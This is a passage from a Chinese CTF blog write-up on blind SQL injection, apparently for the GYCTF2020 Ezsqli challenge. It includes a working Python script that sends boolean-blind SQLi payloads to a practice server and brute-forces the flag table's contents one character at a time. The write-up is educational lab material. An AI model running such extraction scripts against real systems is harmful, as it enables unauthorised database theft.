+<p>跑出来表名为“users233333333333333,f1ag_1s_h3r3_hhhhh”，接下来直接爆数据内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://1457e2ab-f8cd-42b7-b357-2f9db3f89820.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">payload = &#123;&quot;id&quot;: &quot;&quot;&#125;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">num = 0</span><br><span class="line"></span><br><span class="line">def add(result):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    res += result</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">for i in range (1,60):</span><br><span class="line">    if (num == 1):</span><br><span class="line">        break</span><br><span class="line">    for j in range (32,127):</span><br><span class="line">        time.sleep(0.06)</span><br><span class="line">        s = add(flag + chr(j))</span><br><span class="line">        payload[&quot;id&quot;] = &#x27;1^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1&#x27;.format(s)</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line"></span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            flag += chr(j-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if &#x27;&#125;&#x27; in r.text:</span><br><span class="line">            num = 1</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>这里没有用二分法，调试的时候出了点问题，先用爆破代替下，等之后再改过来。这里的数据出来都是大写字母，flag要是小写字母，最后记得改过来就行了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>盲注的主要考点就那三个：注入点寻找、payload构建和脚本编写，基本与平常的sql注入题无异，主要是脚本要多写，善于找到问题，多用几种方式编写脚本。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-mysql-python/" rel="tag"># -web -mysql -python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/15/sqli-labs%E7%BB%83%E4%B9%A0-less38-53/" rel="next" title="sqli-labs练习-less38-53">
+                <i class="fa fa-chevron-left"></i> sqli-labs练习-less38-53
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number"></span> <span class="nav-text">编写脚本常用的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#range"><span class="nav-number">1.</span> <span class="nav-text">range()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#for%E5%BE%AA%E7%8E%AF"><span class="nav-number">2.</span> <span class="nav-text">for循环</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#format"><span class="nav-number">3.</span> <span class="nav-text">format()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#requests"><span class="nav-number">4.</span> <span class="nav-text">requests</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#parms"><span class="nav-number">5.</span> <span class="nav-text">parms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#headers"><span class="nav-number">6.</span> <span class="nav-text">headers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data"><span class="nav-number">7.</span> <span class="nav-text">data</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#time-sleep"><span class="nav-number">8.</span> <span class="nav-text">time.sleep()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#time-time"><span class="nav-number">9.</span> <span class="nav-text">time.time()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">10.</span> <span class="nav-text">注意事项</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="nav-number"></span> <span class="nav-text">布尔盲注脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number"></span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%9C%E4%B8%9Awp"><span class="nav-number"></span> <span class="nav-text">作业wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-finalsql"><span class="nav-number">1.</span> <span class="nav-text">[极客大挑战2019]finalsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Online-Proxy"><span class="nav-number">2.</span> <span class="nav-text">[RoarCTF 2019]Online Proxy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Ezsqli"><span class="nav-number">3.</span> <span class="nav-text">[GYCTF2020]Ezsqli</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
